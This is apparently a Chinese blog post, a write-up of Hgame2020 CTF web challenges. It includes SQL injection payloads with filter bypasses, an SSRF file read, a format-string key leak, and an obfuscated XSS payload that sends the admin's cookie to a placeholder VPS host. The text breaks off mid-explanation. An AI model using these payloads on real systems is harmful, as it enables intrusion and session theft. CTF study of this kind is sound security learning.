@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="每天摸鱼毕设，都没怎么打ctf了，也没怎么学习。。做一下hgame看看新鲜事物 webweek1Cosmos 的博客">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hgame2020 writeup">
+<meta property="og:url" content="http://yoursite.com/2020/02/06/Hgame2020-writeup/index.html">
+<meta property="og:site_name" content="Glarcy">
+<meta property="og:description" content="每天摸鱼毕设，都没怎么打ctf了，也没怎么学习。。做一下hgame看看新鲜事物 webweek1Cosmos 的博客">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/img/hgame/web/1/1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/hgame/web/1/2.jpg">
+<meta property="og:image" content="http://yoursite.com/img/hgame/web/1/3.jpg">
+<meta property="og:image" content="http://yoursite.com/img/hgame/web/2_4/1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/hgame/web/3_1/1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/hgame/web/3_1/2.jpg">
+<meta property="og:image" content="http://yoursite.com/img/hgame/web/3_3/1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/hgame/web/3_3/2.jpg">
+<meta property="og:updated_time" content="2022-04-10T09:55:11.380Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hgame2020 writeup">
+<meta name="twitter:description" content="每天摸鱼毕设，都没怎么打ctf了，也没怎么学习。。做一下hgame看看新鲜事物 webweek1Cosmos 的博客">
+<meta name="twitter:image" content="http://yoursite.com/img/hgame/web/1/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/06/Hgame2020-writeup/">
+
+
+
+
+
+  <title>Hgame2020 writeup | Glarcy</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Glarcy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/06/Hgame2020-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Glarcy">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glarcy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Hgame2020 writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-06T17:40:46+08:00">
+                2020-02-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>每天摸鱼毕设，都没怎么打ctf了，也没怎么学习。。做一下hgame看看新鲜事物</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h3><h4 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h4><p><img src="../../../../img/hgame/web/1/1.jpg" alt="1"></p>
+<a id="more"></a>
+
+<p>想到git泄漏，扫一下站</p>
+<p><img src="../../../../img/hgame/web/1/2.jpg" alt="2"></p>
+<p>访问<code>http://cosmos.hgame.n3ko.co/.git/config</code></p>
+<p><img src="../../../../img/hgame/web/1/3.jpg" alt="3"></p>
+<p>发现了一个github地址，访问查找提交历史拿到flag</p>
+<h4 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h4><p>You need to come from <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a>. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://vidar.club/</span><br></pre></td></tr></table></figure>
+
+<p>You need to visit it locally. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://vidar.club/</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>You need to use Cosmos Brower to visit.  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://vidar.club/</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">User-Agent: Cosmos</span><br></pre></td></tr></table></figure>
+
+<p>看的<code>Your should use POST method :)</code> ，修改get为post</p>
+<p>The flag will be updated after 2077, please wait for it patiently. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://vidar.club/</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">User-Agent: Cosmos</span><br><span class="line">If-unModified-Since: Fri, 01 Jan 2078 00:00:00 GMT</span><br></pre></td></tr></table></figure>
+
+<h4 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h4><p>访问直接就是404，在控制台看到这一句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!</span><br></pre></td></tr></table></figure>
+
+<p>访问原网页，发现405，修改请求方式，按要求提交参数即可getflag</p>
+<h4 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h4><p>抓包修改分数提交即可</p>
+<h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h4><p>存在文件读取</p>
+<p>login.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($admin_password == md5($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'username'</span>] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $_POST[<span class="string">'username'</span>];</span><br><span class="line">            header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由此可以看到，我们可以通过debug参数读取username和password，并且password存在弱类型比较</p>
+<p>登进后台看见一个ssrf，使用file协议读取根目录下的flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://localhost/../../../../flag</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h4><p>简单的sql注入，测试一下，过滤了#、空格、select，使用<code>%23</code>、<code>/**/</code>、双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;/**/union/**/selselectect/**/database()%23</span><br><span class="line">easysql</span><br><span class="line"></span><br><span class="line">?id=-1&apos;/**/union/**/selselectect/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&apos;easysql&apos;%23</span><br><span class="line">f1aggggggggggggg,messages</span><br><span class="line"></span><br><span class="line">?id=-1&apos;/**/union/**/selselectect/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&apos;f1aggggggggggggg&apos;%23</span><br><span class="line">fl4444444g</span><br><span class="line"></span><br><span class="line">?id=-1&apos;/**/union/**/selselectect/**/fl4444444g/**/from/**/f1aggggggggggggg%23</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h4><p>访问/mycode获得源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &amp;lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(base64_encode(base64_encode(strrev(str_rot13(base64_encode(encrypt(encrypt(base64_encode(strrev(base64_encode($_SERVER[<span class="string">'token'</span>])))))))))));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(@$_POST[<span class="string">'token'</span>] === $_SERVER[<span class="string">'token'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span>($_SERVER[<span class="string">'flag'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有一点要注意一下的，就是10个加密函数是会变的，不是固定的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> HTMLParser</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        result += chr(ord(i) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> cipher.decode(<span class="string">'rot_13'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment"># 获取密文</span></span><br><span class="line">    url = <span class="string">"http://adb0c2a102.php.hgame.n3ko.co/"</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    h = HTMLParser.HTMLParser()</span><br><span class="line">    firstIndex = r.content.find(<span class="string">'&lt;/code&gt;&lt;br&gt;'</span>)</span><br><span class="line">    lastIndex = r.content.find(<span class="string">'&lt;br&gt;&lt;/body&gt;'</span>)</span><br><span class="line">    token = h.unescape(r.text[firstIndex + <span class="number">12</span>:lastIndex - <span class="number">20</span>])</span><br><span class="line"></span><br><span class="line">    res = requests.get(url+<span class="string">'/mycode'</span>)</span><br><span class="line">    code = res.content</span><br><span class="line">    firstIndex = code.find(<span class="string">'echo('</span>)</span><br><span class="line">    lastIndex = code.rfind(<span class="string">"($_SERVER['token']"</span>)</span><br><span class="line">    func = code[firstIndex:lastIndex]</span><br><span class="line">    firstIndex = func.find(<span class="string">'echo('</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'base64_encode'</span> <span class="keyword">not</span> <span class="keyword">in</span> code):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            methodIndex = func.rfind(<span class="string">'('</span>)</span><br><span class="line">            <span class="keyword">print</span> func[methodIndex:]</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'base64_encode'</span> <span class="keyword">in</span> func[methodIndex:]):</span><br><span class="line">                token = base64.b64decode(token)</span><br><span class="line">            <span class="keyword">elif</span> (<span class="string">'strrev'</span> <span class="keyword">in</span> func[methodIndex:]):</span><br><span class="line">                token = token[::<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">elif</span> (<span class="string">'str_rot13'</span> <span class="keyword">in</span> func[methodIndex:]):</span><br><span class="line">                token = rot13(token)</span><br><span class="line">            <span class="keyword">elif</span> (<span class="string">'encrypt'</span> <span class="keyword">in</span> func[methodIndex:]):</span><br><span class="line">                token = decrypt(token)</span><br><span class="line">            func = func[firstIndex:methodIndex]</span><br><span class="line">        <span class="keyword">print</span> token</span><br><span class="line">        f = requests.post(url, data=&#123;<span class="string">'token'</span>: token&#125;)</span><br><span class="line">        <span class="keyword">print</span> f.content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h4><p>Xss，闭合的标签会被过滤掉，script会被替换成别的字符，输入的内容会被转换成大写，用html实体编码绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41; &lt;img src=x</span><br></pre></td></tr></table></figure>
+
+<p>构造payload拿管理员token</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://vps_ip:port/?&apos;+document.cookie</span><br></pre></td></tr></table></figure>
+
+<p>base64编码放入atob函数中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(atob(&apos;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8vdnBzX2lwOnBvcnQvPycrZG9jdW1lbnQuY29va2ll&apos;))</span><br></pre></td></tr></table></figure>
+
+<p>html实体编码放入onerror</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img onerror=&amp;#101;&amp;#118;&amp;#97;&amp;#108;&amp;#40;&amp;#97;&amp;#116;&amp;#111;&amp;#98;&amp;#40;&amp;#39;&amp;#99;&amp;#122;&amp;#49;&amp;#106;&amp;#99;&amp;#109;&amp;#86;&amp;#104;&amp;#100;&amp;#71;&amp;#86;&amp;#70;&amp;#98;&amp;#71;&amp;#86;&amp;#116;&amp;#90;&amp;#87;&amp;#53;&amp;#48;&amp;#75;&amp;#67;&amp;#100;&amp;#122;&amp;#89;&amp;#51;&amp;#74;&amp;#112;&amp;#99;&amp;#72;&amp;#81;&amp;#110;&amp;#75;&amp;#84;&amp;#116;&amp;#105;&amp;#98;&amp;#50;&amp;#82;&amp;#53;&amp;#76;&amp;#109;&amp;#70;&amp;#119;&amp;#99;&amp;#71;&amp;#86;&amp;#117;&amp;#90;&amp;#69;&amp;#78;&amp;#111;&amp;#97;&amp;#87;&amp;#120;&amp;#107;&amp;#75;&amp;#72;&amp;#77;&amp;#112;&amp;#79;&amp;#51;&amp;#77;&amp;#117;&amp;#99;&amp;#51;&amp;#74;&amp;#106;&amp;#80;&amp;#83;&amp;#100;&amp;#111;&amp;#100;&amp;#72;&amp;#82;&amp;#119;&amp;#79;&amp;#105;&amp;#56;&amp;#118;&amp;#100;&amp;#110;&amp;#66;&amp;#122;&amp;#88;&amp;#50;&amp;#108;&amp;#119;&amp;#79;&amp;#110;&amp;#66;&amp;#118;&amp;#99;&amp;#110;&amp;#81;&amp;#118;&amp;#80;&amp;#121;&amp;#99;&amp;#114;&amp;#90;&amp;#71;&amp;#57;&amp;#106;&amp;#100;&amp;#87;&amp;#49;&amp;#108;&amp;#98;&amp;#110;&amp;#81;&amp;#117;&amp;#89;&amp;#50;&amp;#57;&amp;#118;&amp;#97;&amp;#50;&amp;#108;&amp;#108;&amp;#39;&amp;#41;&amp;#41; &lt;img src=x</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/hgame/web/2_4/1.jpg" alt="1"></p>
+<p>修改token访问getflag</p>
+<h3 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h3><h4 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h4><p>访问/source.zip得到源代码，当rank为1时即可getflag，通过审计代码发现存在格式化字符串漏洞和反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">private</span> $encryptKey = <span class="string">'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'</span>;</span><br><span class="line">    <span class="keyword">public</span> $welcomeMsg = <span class="string">'%s, Welcome to Ordinal Scale!'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sign = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $rank;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($playerName)</span></span>&#123;</span><br><span class="line">        $_SESSION[<span class="string">'player'</span>] = $playerName;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'exp'</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [$playerName, <span class="keyword">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monster = <span class="keyword">new</span> Monster(<span class="keyword">$this</span>-&gt;sign);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = <span class="keyword">new</span> Rank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在init函数中可以看到<code>playerName</code>和<code>encryptKey</code>做了一个循环，并且sprintf没有任何防护，如果我们<code>playerName</code>输入<code>%s</code>，第二次循环就会输出<code>encryptKey</code></p>
+<p><img src="../../../../img/hgame/web/3_1/1.jpg" alt="1"></p>
+<p>得到key就可以算出sign</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $encryptkey = <span class="string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span>;</span><br><span class="line">    $sign = <span class="string">''</span>;</span><br><span class="line">    $playname = <span class="string">'glarcy'</span>;</span><br><span class="line">    $data = [$playname, $encryptkey];</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $sign .= md5($sign . $value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $sign;</span><br><span class="line"><span class="comment">//aff6ecd6e060051b65fc173e573d89e4b3b6e30320e27165a7c1b8af30cc4f94</span></span><br></pre></td></tr></table></figure>
+
+<p>在rank类发现<code>__destruct</code>魔术方法，当反序列化时，<code>$this-&gt;rank</code>就会赋值给<code>$_SESSION[&#39;rank&#39;]</code></p>
